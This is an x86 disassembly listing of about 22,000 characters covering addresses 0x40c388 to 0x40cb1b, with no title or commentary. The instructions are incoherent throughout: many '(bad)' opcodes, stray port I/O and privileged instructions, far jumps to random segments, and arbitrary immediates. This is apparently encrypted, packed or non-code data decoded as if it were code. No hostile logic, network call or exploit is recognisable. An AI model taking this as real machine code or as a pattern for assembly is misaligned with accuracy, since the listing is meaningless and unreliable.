  40c388:	scas   eax,DWORD PTR es:[edi]
  40c389:	bound  edx,QWORD PTR [edx-0x559b153a]
  40c38f:	adc    BYTE PTR [ebx],cl
  40c391:	inc    esi
  40c392:	jnp    0x40c3ed
  40c394:	iret   
  40c395:	mov    BYTE PTR [esi+ecx*1],dl
  40c398:	into   
  40c399:	lahf   
  40c39a:	mov    ch,0x7c
  40c39c:	add    ebx,edi
  40c39e:	or     bh,BYTE PTR [eax]
  40c3a0:	sbb    DWORD PTR [ecx],ecx
  40c3a2:	jmp    0xa4e34885
  40c3a7:	xor    BYTE PTR [edx+0x7518b100],0xb8
  40c3ae:	rcr    DWORD PTR [esi],1
  40c3b0:	dec    edx
  40c3b1:	fidivr WORD PTR [ebx+eax*2-0x44]
  40c3b5:	or     ah,BYTE PTR [ebx]
  40c3b7:	xchg   BYTE PTR [edx],dh
  40c3b9:	es pop ds
  40c3bb:	into   
  40c3bc:	sbb    eax,0x149af74e
  40c3c1:	mov    WORD PTR [esi+0x53],ds
  40c3c4:	mov    dh,0xde
  40c3c6:	out    0xe0,eax
  40c3c8:	ror    BYTE PTR [ecx-0x44c411cb],cl
  40c3ce:	sti    
  40c3cf:	xor    DWORD PTR ds:0xc64c56d5,edi
  40c3d5:	pop    ebp
  40c3d6:	lods   al,BYTE PTR ds:[esi]
  40c3d7:	repz sub dl,BYTE PTR [esi+0x71810a4a]
  40c3de:	fs cmc 
  40c3e0:	push   ebp
  40c3e1:	dec    esi
  40c3e2:	(bad)  
  40c3e3:	inc    eax
  40c3e4:	mov    ebp,0x8662c0f8
  40c3e9:	mov    ebp,0x8a227f5c
  40c3ee:	pop    es
  40c3ef:	add    al,0x48
  40c3f1:	stos   BYTE PTR es:[edi],al
  40c3f2:	aam    0xfd
  40c3f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3f5:	ja     0x40c3e8
  40c3f7:	xchg   edx,eax
  40c3f8:	ret    0x29ec
  40c3fb:	stc    
  40c3fc:	inc    eax
  40c3fd:	inc    edx
  40c3fe:	clc    
  40c3ff:	push   ss
  40c400:	cmp    BYTE PTR [edx-0x5],0x88
  40c404:	xchg   ebp,eax
  40c405:	sub    DWORD PTR [eax-0x2addef2c],esi
  40c40b:	mov    ds:0x4789ac88,al
  40c410:	mov    DWORD PTR [edi-0x60f302b6],esi
  40c416:	or     al,0xc8
  40c418:	imul   ebx,DWORD PTR [eax-0x5d],0x6b4faf41
  40c41f:	fmul   st,st(3)
  40c421:	jge    0x40c41d
  40c423:	mov    ch,BYTE PTR [edx]
  40c425:	mul    edx
  40c427:	xor    ebx,edx
  40c429:	ret    
  40c42a:	jmp    0x2d2a:0x90c88006
  40c431:	fnstenv [edx+ebx*2+0x61b913ed]
  40c438:	add    esi,DWORD PTR [esi+0x453cab76]
  40c43e:	mov    edi,0x4a312170
  40c443:	push   esi
  40c444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c445:	test   al,0xb1
  40c447:	mov    ch,0xdd
  40c449:	mov    ecx,0xc2f02644
  40c44e:	mov    ebp,0x46bcb9f
  40c453:	lahf   
  40c454:	inc    esp
  40c455:	cmc    
  40c456:	xor    esi,DWORD PTR [ebx+0x1c042b98]
  40c45c:	cmp    dl,BYTE PTR [ecx+esi*2]
  40c45f:	or     bh,al
  40c461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c462:	mov    ebx,0xd8f03306
  40c467:	sysenter 
  40c469:	repz repz pop es
  40c46c:	inc    edx
  40c46e:	nop
  40c46f:	sti    
  40c470:	(bad)  
  40c471:	(bad)  
  40c472:	std    
  40c473:	sub    bl,BYTE PTR [esi+0x209b0a43]
  40c479:	or     bl,BYTE PTR [eax-0x3fa91198]
  40c47f:	(bad)  [eax+0x6ff93d43]
  40c485:	xchg   ebx,eax
  40c486:	stos   DWORD PTR es:[edi],eax
  40c487:	inc    ecx
  40c488:	clc    
  40c489:	dec    eax
  40c48a:	rol    DWORD PTR [edx],1
  40c48c:	pop    esi
  40c48d:	dec    ebx
  40c48e:	in     eax,0x2d
  40c490:	scas   al,BYTE PTR es:[edi]
  40c491:	mov    ds:0x5ea36ac1,eax
  40c496:	xchg   BYTE PTR [ecx+0x4a3057ca],bh
  40c49c:	sbb    dl,BYTE PTR [ebx-0x3dba7d97]
  40c4a2:	adc    al,0x3a
  40c4a4:	stos   BYTE PTR es:[edi],al
  40c4a5:	popf   
  40c4a6:	inc    BYTE PTR [esi]
  40c4a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4a9:	data16 lods al,BYTE PTR ds:[esi]
  40c4ab:	push   eax
  40c4ac:	test   cl,cl
  40c4ae:	jno    0x40c4e5
  40c4b0:	push   cs
  40c4b1:	or     BYTE PTR [ebp+0x69d0ba49],ah
  40c4b7:	ror    BYTE PTR [ebp+0x74],1
  40c4ba:	mov    DWORD PTR ds:0xc8351146,esi
  40c4c0:	movsx  edx,WORD PTR [edx-0x47dfbf5]
  40c4c7:	(bad)  
  40c4c8:	jecxz  0x40c501
  40c4ca:	test   al,0xe9
  40c4cc:	pop    edx
  40c4cd:	out    0x8f,eax
  40c4cf:	mov    DWORD PTR [ebp+0x6d],eax
  40c4d2:	sbb    al,0x85
  40c4d4:	int3   
  40c4d5:	dec    ecx
  40c4d6:	cmp    ch,BYTE PTR [ebp+0x45]
  40c4d9:	xchg   ecx,eax
  40c4da:	out    dx,al
  40c4db:	rcl    DWORD PTR [ecx+0x62644624],1
  40c4e1:	mov    ch,0x76
  40c4e3:	(bad)  
  40c4e4:	push   ebp
  40c4e5:	cmp    al,cl
  40c4e7:	hlt    
  40c4e8:	xchg   BYTE PTR [ecx-0x5b],dl
  40c4eb:	inc    ebx
  40c4ec:	lods   eax,DWORD PTR ds:[esi]
  40c4ed:	sbb    eax,0x1d8771ad
  40c4f2:	mov    dh,0x2
  40c4f4:	lds    esp,FWORD PTR [ebx-0x8]
  40c4f7:	call   0xb0b8:0x7e10d189
  40c4fe:	das    
  40c4ff:	call   0xf6a0:0xb334f875
  40c506:	rol    BYTE PTR [eax],1
  40c508:	outs   dx,DWORD PTR ds:[esi]
  40c509:	lahf   
  40c50a:	into   
  40c50b:	inc    ecx
  40c50c:	add    edi,ebp
  40c50e:	aad    0xfe
  40c510:	(bad)  
  40c511:	xchg   ebx,eax
  40c512:	gs ds pop esp
  40c515:	xchg   ecx,eax
  40c516:	adc    BYTE PTR [eax-0x41a31c45],ch
  40c51c:	call   FWORD PTR [ebp+0x554c428]
  40c522:	cdq    
  40c523:	ins    BYTE PTR es:[edi],dx
  40c524:	xchg   esp,eax
  40c525:	xor    DWORD PTR ss:[eax-0x185dbc3a],edi
  40c52c:	(bad)  
  40c52e:	mov    al,0x4d
  40c530:	mov    cl,0xd7
  40c532:	dec    edi
  40c533:	loopne 0x40c4d2
  40c535:	xchg   ebp,eax
  40c536:	adc    dl,dl
  40c538:	jge    0x40c589
  40c53a:	jle    0x40c5a0
  40c53c:	cmp    BYTE PTR [edx],dl
  40c53e:	mov    eax,0x1e5ebce4
  40c543:	ret    0x87d9
  40c546:	call   0xb060:0xe6a1efb8
  40c54d:	or     eax,0x9564dd98
  40c552:	adc    al,BYTE PTR [edx-0x15]
  40c555:	mov    ah,0xac
  40c557:	mov    edx,0xde204e5e
  40c55c:	scas   al,BYTE PTR es:[edi]
  40c55d:	es pop esp
  40c55f:	dec    esp
  40c560:	sub    DWORD PTR [ecx-0x205fb774],edi
  40c566:	mov    ds:0x36a07eea,eax
  40c56b:	test   DWORD PTR [ecx+eiz*8-0x5326d825],0x6b95aeb8
  40c576:	not    BYTE PTR [eax+0x7ce14a02]
  40c57c:	in     al,dx
  40c57d:	pop    ecx
  40c57e:	scas   eax,DWORD PTR es:[edi]
  40c57f:	inc    eax
  40c580:	dec    edi
  40c581:	shl    BYTE PTR [esi-0x688adb37],0x7b
  40c588:	push   cs
  40c589:	jo     0x40c5fd
  40c58b:	add    al,0x10
  40c58d:	cs scas eax,DWORD PTR es:[edi]
  40c58f:	and    al,0x48
  40c591:	ins    BYTE PTR es:[edi],dx
  40c592:	mov    eax,ds:0xdf10d6be
  40c597:	sbb    ch,BYTE PTR [edi]
  40c599:	and    al,0x21
  40c59b:	sub    DWORD PTR [esi+0x660716c],eax
  40c5a1:	dec    ebx
  40c5a2:	arpl   WORD PTR [edx],dx
  40c5a4:	fs out 0x9c,eax
  40c5a7:	ss int 0x39
  40c5aa:	cs mov dh,0x23
  40c5ad:	or     BYTE PTR [ebp-0x895bae2],0x36
  40c5b4:	ja     0x40c5fc
  40c5b6:	aad    0xf
  40c5b8:	dec    esi
  40c5b9:	push   esp
  40c5ba:	ficom  WORD PTR [ecx-0x35]
  40c5bd:	push   ss
  40c5be:	sti    
  40c5bf:	pushf  
  40c5c0:	mov    ebp,0xb78027f5
  40c5c5:	scas   al,BYTE PTR es:[edi]
  40c5c6:	push   es
  40c5c7:	and    eax,0x438e86d8
  40c5cc:	sub    eax,0x91fdab1e
  40c5d1:	popa   
  40c5d2:	sahf   
  40c5d3:	dec    edi
  40c5d4:	cli    
  40c5d5:	add    eax,0xec88fb76
  40c5da:	sbb    ebx,DWORD PTR [esi]
  40c5dc:	cs push ss
  40c5de:	int    0xb6
  40c5e0:	aaa    
  40c5e1:	in     al,0x72
  40c5e3:	sbb    al,BYTE PTR [esi-0x14]
  40c5e6:	mov    ah,0x59
  40c5e8:	jmp    0x40c5be
  40c5ea:	sub    eax,0x3430b28c
  40c5ef:	jno    0x40c5aa
  40c5f1:	or     ch,bl
  40c5f3:	sbb    al,0x69
  40c5f5:	imul   DWORD PTR [edi+0x1baca50e]
  40c5fb:	sahf   
  40c5fc:	scas   al,BYTE PTR es:[edi]
  40c5fd:	sbb    eax,esi
  40c5ff:	repnz sub eax,0x732e02a4
  40c605:	in     al,dx
  40c606:	pop    ss
  40c607:	stc    
  40c608:	aam    0x97
  40c60a:	or     DWORD PTR [ecx],eax
  40c60c:	fst    DWORD PTR [eax]
  40c60e:	gs into 
  40c610:	pop    ebx
  40c611:	jmp    0x31015ef3
  40c616:	mov    eax,ds:0x82d1f95d
  40c61b:	mov    ebp,0xba87b2da
  40c620:	or     edi,esi
  40c622:	xchg   esp,eax
  40c623:	loope  0x40c65f
  40c625:	ret    0x99ea
  40c628:	lahf   
  40c629:	jp     0x40c5f0
  40c62b:	xor    eax,0xff3e0424
  40c630:	jg     0x40c617
  40c632:	popa   
  40c633:	aam    0xb3
  40c635:	pop    ebp
  40c636:	and    BYTE PTR [ebp-0x6],dh
  40c639:	mov    ebx,0x316b3f30
  40c63e:	ret    0x7f68
  40c641:	loopne 0x40c679
  40c643:	sub    cl,dh
  40c645:	or     BYTE PTR [esi+ebx*8+0x43cc016a],dl
  40c64c:	scas   eax,DWORD PTR es:[edi]
  40c64d:	mov    edi,0xbad076fe
  40c652:	scas   eax,DWORD PTR es:[edi]
  40c653:	adc    DWORD PTR [ebx-0x55],0xffffff8f
  40c657:	call   0xf74c5baf
  40c65c:	test   DWORD PTR [esi+0xa],eax
  40c65f:	xchg   esi,eax
  40c660:	pop    edi
  40c661:	bound  esp,QWORD PTR [edi-0x336b3f5e]
  40c667:	inc    ecx
  40c668:	imul   ebp,DWORD PTR [ecx+0x7b],0xf6c5ade
  40c66f:	aas    
  40c670:	inc    edi
  40c671:	and    bh,BYTE PTR fs:0x2baf3423
  40c678:	pop    esi
  40c679:	pop    ds
  40c67a:	and    eax,0x5fbecd2a
  40c67f:	adc    DWORD PTR [esi+eiz*1],ecx
  40c682:	in     al,dx
  40c683:	cs xor al,0x49
  40c686:	pushf  
  40c687:	adc    dh,BYTE PTR [ecx-0x670a7a92]
  40c68d:	les    ebp,FWORD PTR [edx+0x58b74242]
  40c693:	pop    ss
  40c694:	and    al,BYTE PTR [eax+0x6383d232]
  40c69a:	xlat   BYTE PTR ds:[ebx]
  40c69b:	cmp    BYTE PTR [ecx],al
  40c69d:	(bad)  
  40c69e:	push   ss
  40c69f:	or     BYTE PTR [edx],cl
  40c6a1:	jmp    DWORD PTR [ebp-0x1dd9715]
  40c6a7:	jb     0x40c6c6
  40c6a9:	sti    
  40c6aa:	xchg   esp,eax
  40c6ab:	daa    
  40c6ac:	adc    cl,BYTE PTR [ecx]
  40c6ae:	or     eax,0x90ed6aff
  40c6b3:	inc    di
  40c6b5:	fwait
  40c6b6:	xor    al,0xac
  40c6b8:	dec    edx
  40c6b9:	aas    
  40c6ba:	jle    0x40c715
  40c6bc:	lock shr ah,1
  40c6bf:	repnz dec ebp
  40c6c1:	sub    BYTE PTR [bx],0xee
  40c6c5:	into   
  40c6c6:	fcom   QWORD PTR [ecx+0x7abed1ec]
  40c6cc:	rcr    bl,1
  40c6ce:	ins    DWORD PTR es:[edi],dx
  40c6cf:	xchg   esp,eax
  40c6d0:	imul   ecx,DWORD PTR [edx+0x32],0xfffffffa
  40c6d4:	sbb    esp,DWORD PTR [ecx+0x577051ef]
  40c6da:	inc    ebx
  40c6db:	inc    esp
  40c6dc:	(bad)  
  40c6dd:	dec    esi
  40c6de:	fdivr  QWORD PTR [eax-0x6cc7e0dd]
  40c6e4:	push   es
  40c6e5:	pushf  
  40c6e6:	push   edi
  40c6e7:	hlt    
  40c6e8:	mov    al,0xa4
  40c6ea:	xor    BYTE PTR ds:0x92edd3ec,dl
  40c6f0:	mov    al,ds:0x6ba9e206
  40c6f5:	push   esp
  40c6f6:	fldcw  WORD PTR [ebx+ecx*4]
  40c6f9:	jne    0x40c727
  40c6fb:	mov    dl,0xef
  40c6fd:	xchg   bh,bl
  40c6ff:	push   eax
  40c700:	loopne 0x40c68f
  40c702:	push   ebp
  40c703:	icebp  
  40c704:	mov    ds:0x4ce7dea7,al
  40c709:	out    0xca,eax
  40c70b:	nop
  40c70c:	fs stc 
  40c70e:	mov    ch,0x41
  40c710:	dec    edx
  40c711:	pop    edx
  40c712:	adc    ecx,ecx
  40c714:	mov    edx,0x509aa87d
  40c719:	popa   
  40c71a:	jno    0x40c73c
  40c71c:	clc    
  40c71d:	sbb    BYTE PTR [edi+0x7ee702bf],bl
  40c723:	fiadd  DWORD PTR [esi-0x24]
  40c726:	dec    edx
  40c727:	ins    DWORD PTR es:[edi],dx
  40c728:	jmp    0xb600af93
  40c72d:	(bad)  
  40c72e:	stos   BYTE PTR es:[edi],al
  40c72f:	push   cs
  40c730:	pop    esp
  40c731:	(bad)  
  40c732:	mov    eax,0x3cfe972f
  40c737:	dec    esi
  40c738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c739:	(bad)  
  40c73a:	push   0x6e
  40c73c:	xchg   ecx,eax
  40c73d:	(bad)  
  40c73f:	or     ah,BYTE PTR [eax-0x1b160a20]
  40c745:	push   0xffffffcf
  40c747:	jae    0x40c728
  40c749:	xor    BYTE PTR ds:0x940ceef,bh
  40c74f:	daa    
  40c750:	(bad)  
  40c752:	sub    BYTE PTR [ecx+0x40],dl
  40c755:	or     edx,DWORD PTR [ecx-0x56b3b53d]
  40c75b:	lock in al,0xcc
  40c75e:	data16 test al,0x14
  40c761:	js     0x40c706
  40c763:	mov    DWORD PTR [ebx+0x36403d9f],ebx
  40c769:	mov    WORD PTR [ebx-0x560fc87b],es
  40c76f:	icebp  
  40c770:	add    DWORD PTR [eax],ebx
  40c772:	sub    al,0x16
  40c774:	aas    
  40c775:	pusha  
  40c776:	(bad)  [eax+0xc80f9c9]
  40c77c:	les    esp,FWORD PTR [edx+0x23]
  40c77f:	pop    ss
  40c780:	sbb    BYTE PTR [edx],al
  40c782:	jle    0x40c722
  40c784:	test   eax,0x7a7d590d
  40c789:	push   edx
  40c78a:	jno    0x40c79c
  40c78c:	ret    
  40c78d:	adc    dl,ah
  40c78f:	ds pusha 
  40c791:	jp     0x40c72f
  40c793:	clc    
  40c794:	sub    al,0xc8
  40c796:	xchg   esi,eax
  40c797:	shr    BYTE PTR [edx],cl
  40c799:	mov    ch,0x9e
  40c79b:	idiv   BYTE PTR [esp+eax*4+0x6d2b756d]
  40c7a2:	pop    esp
  40c7a3:	dec    DWORD PTR [ebp-0x21]
  40c7a6:	idiv   al
  40c7a8:	add    eax,0x3468e852
  40c7ad:	inc    eax
  40c7ae:	jb     0x40c731
  40c7b0:	push   eax
  40c7b1:	call   0xc284:0xb12ebabd
  40c7b8:	cs sub eax,0xe93caac7
  40c7be:	dec    edi
  40c7bf:	add    DWORD PTR [edx+0x555923d9],ecx
  40c7c5:	fadd   st,st(0)
  40c7c7:	and    al,0x89
  40c7c9:	(bad)  
  40c7ca:	push   cs
  40c7cb:	aam    0x9c
  40c7cd:	lds    ebp,FWORD PTR [edi+0x2a46b046]
  40c7d3:	cld    
  40c7d4:	push   esp
  40c7d5:	pop    edx
  40c7d6:	cdq    
  40c7d7:	scas   al,BYTE PTR es:[edi]
  40c7d8:	(bad)  
  40c7d9:	inc    esi
  40c7da:	push   ebp
  40c7db:	jl     0x40c81c
  40c7dd:	mov    ebx,0xdd413b4
  40c7e2:	xchg   cl,ch
  40c7e4:	(bad)  
  40c7e5:	sti    
  40c7e6:	push   ebx
  40c7e7:	mov    edi,0x838fa2cc
  40c7ec:	and    bl,bl
  40c7ee:	or     eax,0x2c2c099d
  40c7f3:	jmp    DWORD PTR [ecx-0x6caf36e5]
  40c7f9:	out    dx,eax
  40c7fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7fb:	(bad)  
  40c7fc:	out    0x5d,al
  40c7fe:	out    0x29,al
  40c800:	add    BYTE PTR [ecx+0x1],al
  40c803:	xchg   ebp,eax
  40c804:	add    ebp,DWORD PTR [edx+0x2437b365]
  40c80a:	mov    ch,0x50
  40c80c:	aaa    
  40c80d:	xchg   esi,eax
  40c80e:	or     esp,DWORD PTR [esi-0x36]
  40c811:	and    al,0x2
  40c813:	or     bh,ah
  40c815:	shl    eax,1
  40c817:	jg     0x40c7ac
  40c819:	aas    
  40c81a:	or     DWORD PTR [edi-0x21369ce2],esi
  40c820:	loope  0x40c807
  40c822:	sar    DWORD PTR [edx+0x370e5714],0xa8
  40c829:	and    al,0xa9
  40c82b:	gs mov ebx,0xc7e05f6b
  40c831:	ret    
  40c832:	inc    eax
  40c833:	jno    0x40c7e2
  40c835:	pop    es
  40c836:	push   ds
  40c837:	add    ebp,ecx
  40c839:	xor    eax,DWORD PTR [ecx-0x65dafbb1]
  40c83f:	test   al,0xb7
  40c841:	in     al,0xb1
  40c843:	dec    ecx
  40c844:	imul   esi,DWORD PTR [esi+edx*2+0x3d],0x1c4cc74
  40c84c:	jo     0x40c7ce
  40c84e:	popa   
  40c84f:	call   0x2ecf:0xb1612d44
  40c856:	iret   
  40c857:	and    eax,0xf7537156
  40c85c:	and    ecx,0xffffffd8
  40c85f:	xchg   esp,eax
  40c860:	jno    0x40c84b
  40c862:	ja     0x40c7fb
  40c864:	dec    ecx
  40c865:	les    esi,FWORD PTR [edx]
  40c867:	lock fst QWORD PTR [edx]
  40c86a:	mov    al,BYTE PTR [ebp+0x611a06af]
  40c870:	cdq    
  40c871:	pop    es
  40c872:	retf   
  40c873:	jbe    0x40c88e
  40c875:	mov    dh,0xe9
  40c877:	sbb    eax,0xf3d21e14
  40c87c:	jg     0x40c891
  40c87e:	out    0x8c,al
  40c880:	rol    edi,cl
  40c882:	jmp    0x72f7:0x2cc3d81b
  40c889:	(bad)  
  40c88a:	fsub   DWORD PTR [ebx-0x30]
  40c88d:	or     al,0x84
  40c88f:	retf   
  40c890:	jns    0x40c89d
  40c892:	add    esp,edx
  40c894:	xlat   BYTE PTR ds:[ebx]
  40c895:	fidivr WORD PTR [eax]
  40c897:	cmp    DWORD PTR [esi+ebx*8],edi
  40c89a:	jnp    0x40c8c4
  40c89c:	scas   al,BYTE PTR es:[edi]
  40c89d:	test   eax,0x94ec551a
  40c8a2:	dec    esi
  40c8a3:	std    
  40c8a4:	in     al,0x3b
  40c8a6:	sbb    al,0x76
  40c8a8:	jmp    0x235a217
  40c8ad:	push   eax
  40c8ae:	add    al,0xe0
  40c8b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8b1:	sbb    eax,0x74b61dfc
  40c8b6:	ret    0x9312
  40c8b9:	mov    es,edi
  40c8bb:	popf   
  40c8bc:	mov    edx,0x56e1237
  40c8c1:	or     ebp,DWORD PTR [ebp+0x32461c3e]
  40c8c7:	and    esi,DWORD PTR [edi]
  40c8c9:	and    esp,DWORD PTR [ecx+0x7468e874]
  40c8cf:	(bad)  
  40c8d0:	adc    DWORD PTR [ebx+0x1e],esi
  40c8d3:	pop    eax
  40c8d4:	enter  0xfb0b,0x39
  40c8d8:	call   0x4206eefe
  40c8dd:	sbb    al,0x54
  40c8df:	fnstenv [ebp-0x3f]
  40c8e2:	cmp    ah,bh
  40c8e4:	xchg   edi,eax
  40c8e5:	call   0x1c410966
  40c8ea:	stos   DWORD PTR es:[edi],eax
  40c8eb:	jmp    0x40c93c
  40c8ed:	retf   0xffaa
  40c8f0:	or     cl,bl
  40c8f2:	mov    ecx,0xfe4aa192
  40c8f7:	mov    ecx,0x578de98d
  40c8fc:	mov    edi,0x3b3d2a7c
  40c901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c902:	out    dx,eax
  40c903:	nop
  40c904:	adc    al,0x65
  40c906:	aam    0x6e
  40c908:	call   0xb3de:0xaab0dec2
  40c90f:	call   0xb346:0x2325773f
  40c916:	adc    al,0x86
  40c918:	into   
  40c919:	(bad)  
  40c91a:	pop    edi
  40c91b:	jle    0x40c997
  40c91d:	or     esp,DWORD PTR [edx-0x2f]
  40c920:	mov    edi,0x8f567c7
  40c925:	sbb    eax,0xcc0b95be
  40c92a:	(bad)  
  40c92b:	xchg   ecx,eax
  40c92c:	xor    al,BYTE PTR [edx]
  40c92e:	push   0xffffffea
  40c930:	fdivr  DWORD PTR [ebp-0x24]
  40c933:	inc    ebx
  40c934:	in     eax,0x32
  40c936:	add    DWORD PTR [ebx],esp
  40c938:	(bad)  
  40c939:	popf   
  40c93a:	jae    0x40c8bc
  40c93c:	stos   BYTE PTR es:[edi],al
  40c93d:	outs   dx,DWORD PTR ds:[esi]
  40c93e:	sti    
  40c93f:	adc    dh,bh
  40c941:	ins    BYTE PTR es:[edi],dx
  40c942:	xchg   al,ch
  40c944:	mov    ah,0x94
  40c946:	cdq    
  40c947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c948:	mov    ebp,DWORD PTR [edx-0x7018ffc5]
  40c94e:	xchg   esp,eax
  40c94f:	fist   DWORD PTR [ebp-0x46]
  40c952:	inc    edx
  40c953:	mov    al,0x4
  40c955:	push   ebx
  40c956:	es rcr dl,cl
  40c959:	ja     0x40c973
  40c95b:	mov    esi,0xa81871e
  40c960:	cmp    DWORD PTR [edx+ecx*2-0x6f],0x340831d4
  40c968:	push   ecx
  40c969:	test   eax,0xa671e9d9
  40c96e:	mov    ch,0x1a
  40c970:	sub    ebx,DWORD PTR [edx-0x6bef5c58]
  40c976:	in     eax,dx
  40c977:	sub    al,0xe0
  40c979:	fiadd  DWORD PTR [ecx+0xbcac023]
  40c97f:	pop    ss
  40c980:	jmp    0xf2e9:0x8ae96799
  40c987:	rcl    DWORD PTR [ecx+0x12c49767],0xb1
  40c98e:	stos   DWORD PTR es:[edi],eax
  40c98f:	stos   DWORD PTR es:[edi],eax
  40c990:	pop    esi
  40c991:	aaa    
  40c992:	pop    ecx
  40c993:	cmp    edi,ecx
  40c995:	jl     0x40ca16
  40c997:	das    
  40c998:	scas   eax,DWORD PTR es:[edi]
  40c999:	fdiv   DWORD PTR ds:0x65a5e67e
  40c99f:	mov    ebp,0xea3d44ea
  40c9a4:	mov    ch,ch
  40c9a6:	stos   DWORD PTR es:[edi],eax
  40c9a7:	jne    0x40c9da
  40c9a9:	lahf   
  40c9aa:	mov    al,0x90
  40c9ac:	not    DWORD PTR es:[di+0x3c]
  40c9b1:	xor    BYTE PTR [ebx+0x4a49227],cl
  40c9b7:	ja     0x40c999
  40c9b9:	cmp    DWORD PTR [ebx-0x4f105d8c],esp
  40c9bf:	xor    esp,ebp
  40c9c1:	icebp  
  40c9c2:	int    0xfe
  40c9c4:	cmp    al,0x8f
  40c9c6:	(bad)  
  40c9c7:	jge    0x40c97e
  40c9c9:	shl    BYTE PTR [edx+esi*1],1
  40c9cc:	jmp    0x3c24:0xd72d8d86
  40c9d3:	jae    0x40c9e6
  40c9d5:	shr    DWORD PTR [ecx],1
  40c9d7:	pop    ecx
  40c9d8:	stos   DWORD PTR es:[edi],eax
  40c9d9:	xlat   BYTE PTR ds:[ebx]
  40c9da:	pushf  
  40c9db:	jns    0x40ca2c
  40c9dd:	xchg   ebx,eax
  40c9de:	call   0x68d5e432
  40c9e3:	mov    ecx,gs
  40c9e5:	mov    ecx,ebp
  40c9e7:	push   esp
  40c9e8:	outs   dx,BYTE PTR ds:[esi]
  40c9e9:	hlt    
  40c9ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9eb:	das    
  40c9ec:	cmp    al,0xf6
  40c9ee:	fild   DWORD PTR [edi+0x4]
  40c9f1:	pop    edi
  40c9f2:	out    dx,al
  40c9f3:	imul   ebp,DWORD PTR [edx],0xffffffd7
  40c9f6:	dec    ebp
  40c9f7:	stc    
  40c9f8:	jo     0x40ca4e
  40c9fa:	inc    edx
  40c9fb:	adc    eax,0xbb4da04e
  40ca00:	inc    eax
  40ca01:	xor    ebx,DWORD PTR [ebp-0x4f]
  40ca04:	dec    ebp
  40ca05:	xlat   BYTE PTR ds:[ebx]
  40ca06:	push   esi
  40ca07:	cld    
  40ca08:	cmp    ecx,esi
  40ca0a:	or     edi,ecx
  40ca0c:	rcl    BYTE PTR ds:0xb3b81c6,1
  40ca12:	and    BYTE PTR [edi-0x47],dl
  40ca15:	loope  0x40c9ff
  40ca17:	addr16 repz and al,0x7
  40ca1b:	or     al,0x57
  40ca1d:	lods   al,BYTE PTR ds:[esi]
  40ca1e:	cmp    al,0x25
  40ca20:	lds    edx,FWORD PTR [edi+edx*4-0x5841ceba]
  40ca27:	test   edi,ebx
  40ca29:	(bad)  
  40ca2a:	push   esi
  40ca2b:	jecxz  0x40ca4a
  40ca2d:	dec    edi
  40ca2e:	retf   0x61fd
  40ca31:	pop    es
  40ca32:	nop
  40ca33:	ss ins DWORD PTR es:[edi],dx
  40ca35:	or     DWORD PTR cs:[edx-0xe3b3505],esi
  40ca3c:	jns    0x40c9f3
  40ca3e:	dec    eax
  40ca3f:	stos   BYTE PTR es:[edi],al
  40ca40:	jnp    0x40ca86
  40ca42:	pop    ebp
  40ca43:	mov    eax,ds:0x83129b5f
  40ca48:	int    0x1e
  40ca4a:	xchg   edi,eax
  40ca4b:	aam    0x5f
  40ca4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca4e:	mov    ebx,esp
  40ca50:	xor    al,0xe8
  40ca52:	lock jmp 0x40ca1c
  40ca55:	mov    esp,0x1f20bd61
  40ca5a:	jno    0x40ca06
  40ca5c:	add    eax,0xf387ae9f
  40ca61:	popf   
  40ca62:	test   al,0x29
  40ca64:	ss aam 0x99
  40ca67:	je     0x40ca94
  40ca69:	ror    ch,cl
  40ca6b:	mov    BYTE PTR [ebx-0x61cfce3],dh
  40ca71:	inc    edi
  40ca72:	cld    
  40ca73:	xor    al,0x90
  40ca75:	mov    DWORD PTR ds:0x433a01e4,ecx
  40ca7b:	mov    esi,DWORD PTR [edi]
  40ca7d:	iret   
  40ca7e:	jbe    0x40cafa
  40ca80:	lds    edi,FWORD PTR [edi+0x103f89c0]
  40ca86:	in     eax,dx
  40ca87:	push   ds
  40ca88:	mov    dh,0xc9
  40ca8a:	cmp    DWORD PTR [eax+0x11],eax
  40ca8d:	push   esp
  40ca8e:	xor    BYTE PTR [ebp+0x3],ch
  40ca91:	and    dl,BYTE PTR [esi+0x43757e79]
  40ca97:	(bad)  
  40ca98:	mov    dh,0xf2
  40ca9a:	push   esp
  40ca9b:	adc    eax,0x9c7ea3de
  40caa0:	cwde   
  40caa1:	push   0xffffff82
  40caa3:	mov    ebp,0xecf2f502
  40caa8:	and    al,0x68
  40caaa:	repz sub esp,edx
  40caad:	fcomp  QWORD PTR [edi+0x23fd205c]
  40cab3:	xor    BYTE PTR [ebx+0x57],0x1e
  40cab7:	mov    ds:0xc7145fa0,al
  40cabc:	jg     0x40cb02
  40cabe:	cmp    BYTE PTR [edx-0x4a8f950b],0x54
  40cac5:	in     eax,dx
  40cac6:	mov    WORD PTR ds:0xe23d5f50,fs
  40cacc:	inc    esi
  40cacd:	sub    edx,DWORD PTR [ebx+0x72]
  40cad0:	call   DWORD PTR [esp+ecx*4]
  40cad3:	adc    ecx,DWORD PTR [ebp-0x32599007]
  40cad9:	sti    
  40cada:	sbb    eax,0x7de28ad7
  40cadf:	je     0x40cb0d
  40cae1:	nop
  40cae2:	push   esp
  40cae3:	xor    eax,0xc29fef0d
  40cae8:	retf   0x9082
  40caeb:	jp     0x40caad
  40caed:	dec    eax
  40caee:	fwait
  40caef:	dec    edi
  40caf0:	div    dl
  40caf2:	xor    cl,BYTE PTR [ebp+0x1ebb5e06]
  40caf8:	xchg   BYTE PTR [edx-0x38],bh
  40cafb:	lock dec edi
  40cafd:	neg    BYTE PTR [edx-0x43460546]
  40cb03:	mov    ebp,0x7a65b437
  40cb08:	cmp    BYTE PTR [esi],0x30
  40cb0b:	ds sbb al,0xc8
  40cb0e:	push   es
  40cb0f:	or     DWORD PTR [ebx-0x7f2ea5ba],eax
  40cb15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb16:	and    eax,0x430539d4
  40cb1b:	idiv   BYTE PTR [ecx+0x8]
